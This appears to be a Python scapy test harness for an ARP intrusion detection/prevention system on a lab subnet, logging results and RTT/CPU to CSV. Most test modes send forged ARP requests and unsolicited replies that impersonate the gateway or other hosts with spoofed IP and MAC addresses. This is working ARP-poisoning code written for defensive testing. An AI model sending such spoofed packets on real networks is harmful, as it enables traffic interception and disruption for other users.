#!/usr/bin/python3
import os.path
import csv # Store Results
import psutil
import subprocess
import time
from datetime import datetime
import socket
import scapy.all as scapy
import netifaces as ni
import argparse


def parseArguments():
    parser = argparse.ArgumentParser(description='Simple tool to Test ARP IDPS')
    parser.add_argument('-p', dest="pois", type=str, choices=['1.1','1.2','1.3','2.1','2.2','2.3','2.4','2.5','rtt','cpu'], help='Spoof type by ID')
    parser.add_argument('-m', dest="mode", type=str, choices=['s', 'c', 'r'], help='Used for Reply attack testing, One device as (s)erver and other device as (c)lient, or (r)ply only')
    parser.add_argument('-t', dest="time", type=int, default=60, help='Time between tests')
    parser.add_argument('-c', dest="count", type=int, default=100, help='Times to test')
    parser.add_argument('-o', dest="output", type=str, help='Extension text to output file')

    return parser.parse_args()


def writeIntoCSV(filen, data):
    filen = filen+".csv"
    print("Writing results into {}".format(filen))
    with open(filen,'w', newline='') as fd:
        writer = csv.writer(fd)
        for row in data:
            writer.writerow(row)


def main(args):
    if args.pois:
        filename = "TestID_{}".format(args.pois)
        if args.output:
            filename = filename + "_{}".format(args.output)
        if args.pois == "1.1":
            data = []
            msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="who-has", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.1", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.50")
            for i in range(args.count):
                print("Test number {}..".format(i))
                test = [i,datetime.now()]
                answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                if len(answered) > 0:
                    test.append("1")
                elif len(unanswered) > 0:
                    test.append("0")
                data.append(test)
                time.sleep(args.time)
            writeIntoCSV(filename,data)

        elif args.pois == "1.2":
            print("Ensure this machines MAC is unknown in IDPS")
            data = []
            msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="who-has", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.1", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.50")
            for i in range(args.count):
                print("Test number {}..".format(i))
                test = [i,datetime.now()]
                answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                if len(answered) > 0:
                    test.append("1")
                elif len(unanswered) > 0:
                    test.append("0")
                data.append(test)
                time.sleep(args.time)
            writeIntoCSV(filename,data)

        elif args.pois == "1.3":
            data = []
            msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="who-has", hwsrc="00:00:00:01:02:03", psrc="192.168.4.100", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.1")
            for i in range(args.count):
                print("Test number {}..".format(i))
                test = [i,datetime.now()]
                answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                if len(answered) > 0:
                    test.append("1")
                elif len(unanswered) > 0:
                    test.append("0")
                data.append(test)
                time.sleep(args.time)
            writeIntoCSV(filename,data)
        
        elif args.pois == "2.1":
            if args.mode == "c":
                def respond_func(pkt):
                    if pkt.pdst == ni.ifaddresses('eth0')[ni.AF_INET][0]["addr"] and pkt[scapy.ARP].op == 1:
                        # create arp reply paket
                        msg = scapy.Ether(dst=pkt.hwsrc, src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.1", hwdst=pkt.hwsrc, pdst=pkt.psrc)
                        scapy.srp(msg,verbose=False, timeout=1)
                print("Starting Sniffing...")
                scapy.sniff(iface="eth0", prn=respond_func, filter='arp and host 192.168.4.100', store=0)
                print("Stopped Sniffing...")
            elif args.mode == "s":
                msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="who-has", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc=ni.ifaddresses('eth0')[ni.AF_INET][0]["addr"], hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.100")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        print("Responded")
                    elif len(unanswered) > 0:
                        print("Fuck")
                    time.sleep(args.time)
            elif args.mode == "r":
                #Cheat mode just send "is-at" a reply to no request
                data = []
                msg = scapy.Ether(dst="b8:27:eb:97:23:a2", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.1", hwdst="b8:27:eb:97:23:a2", pdst="192.168.4.50")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    test = [i,datetime.now()]
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        test.append("1")
                    elif len(unanswered) > 0:
                        test.append("0")
                    data.append(test)
                    time.sleep(args.time)
                writeIntoCSV(filename,data)
        elif args.pois == "2.2":
            if args.mode in ("c", "s"): print("not supported")
            else:
                data = []
                msg = scapy.Ether(dst="b8:27:eb:97:23:a2", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.100", hwdst="b8:27:eb:97:23:a2", pdst="192.168.4.1")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    test = [i,datetime.now()]
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        test.append("1")
                    elif len(unanswered) > 0:
                        test.append("0")
                    data.append(test)
                    time.sleep(args.time)
                writeIntoCSV(filename,data)
        elif args.pois == "2.3":
            if args.mode in ("c", "s"): print("not supported")
            else:
                data = []
                msg = scapy.Ether(dst="b8:27:eb:97:23:a2", src="00:00:aa:bb:cc:ff") / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.100", hwdst="b8:27:eb:97:23:a2", pdst="192.168.4.50")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    test = [i,datetime.now()]
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        test.append("1")
                    elif len(unanswered) > 0:
                        test.append("0")
                    data.append(test)
                    time.sleep(args.time)
                writeIntoCSV(filename,data)
        elif args.pois == "2.4":
            if args.mode in ("c", "s"): print("not supported")
            else:
                data = []
                msg = scapy.Ether(dst="b8:27:eb:97:23:a4", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.100", hwdst="b8:27:eb:97:23:a2", pdst="192.168.4.50")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    test = [i,datetime.now()]
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        test.append("1")
                    elif len(unanswered) > 0:
                        test.append("0")
                    data.append(test)
                    time.sleep(args.time)
                writeIntoCSV(filename,data)
        elif args.pois == "2.5":
            if args.mode in ("c", "s"): print("not supported")
            else:
                data = []
                msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="is-at", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.100", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.50")
                for i in range(args.count):
                    print("Test number {}..".format(i))
                    test = [i,datetime.now()]
                    answered,unanswered = scapy.srp(msg, verbose=False, timeout=1)
                    if len(answered) > 0:
                        test.append("1")
                    elif len(unanswered) > 0:
                        test.append("0")
                    data.append(test)
                    time.sleep(args.time)
                writeIntoCSV(filename,data)

        elif args.pois == "rtt":
            data = []
            msg = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"]) / scapy.ARP(op="who-has", hwsrc=ni.ifaddresses('eth0')[ni.AF_LINK][0]["addr"], psrc="192.168.4.100", hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.4.50")
            for i in range(args.count):
                print("Test number {}..".format(i))
                test = [i,time.time()]
                answered = scapy.srp1(msg, verbose=False, timeout=1)
                if len(answered) > 0:
                    test.append(answered.time)
                    test.append((answered.time - test[1])*1000) # Convert seconds to milliseconds
                    print("Returned in {}ms".format(test[-1]))
                data.append(test)
                time.sleep(args.time)
            writeIntoCSV(filename,data)
        elif args.pois == "cpu":
            data = []
            for i in range(args.count):
                print("Test number {}..".format(i))
                test = [i,datetime.now()]
                test.append(psutil.cpu_percent())
                data.append(test)
                time.sleep(args.time)
            writeIntoCSV(filename,data)
        else:
            print("No idea")

if __name__ == "__main__":
    main(parseArguments())
